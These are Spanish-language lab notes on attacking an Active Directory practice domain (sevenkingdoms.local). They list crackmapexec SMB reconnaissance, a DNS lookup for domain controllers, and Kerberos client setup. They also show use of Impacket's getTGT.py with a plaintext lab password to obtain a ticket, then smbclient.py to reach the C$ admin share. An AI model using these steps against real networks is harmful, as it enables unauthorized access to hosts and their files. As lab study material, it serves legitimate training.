## Recon
```bash
# verifica que el protocolo de smb ande corriendo en las maquinas
cme smb 192.168.56.1/24
# verifica los dominios disponibles
nslookup -type=srv _ldap._tcp.dc._msdcs.sevenkingdoms.local 192.168.56.10
```

##### Opcional
Como se estara trabajando con autenticacion de Kerberos, podemos configurar el cliente de kerberos en linux, esto se puede realizar con la informacion obtenida en los pasos anteriores:
```bash
# instalamos el cliente de kerberos
sudo apt install krb5-user
```
Agregamos la siguiente configuracion en el archivo `/etc/krb5.conf`:
![[Pasted image 20250304233601.png]]

Ahora procedemos a correr:
```
getTGT.py north.sevenkingdoms.local/eddard.stark:FightP3aceAndHonor!
```

Recibiremos un output como este:
```bash
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in eddard.stark.ccache
```

Esto genera un ticket para el usuario eddard.stark que podemos utilizar para llamar al DC01:
```bash
export KRB5CCNAME=$(pwd)/eddard.stark.ccache
smbclient.py -k @castelblack.north.sevenkingdoms.local
```

Con la consola de smbclient, podemos verificar que el share de C es accesible con:
```bash
use C$
ls
```
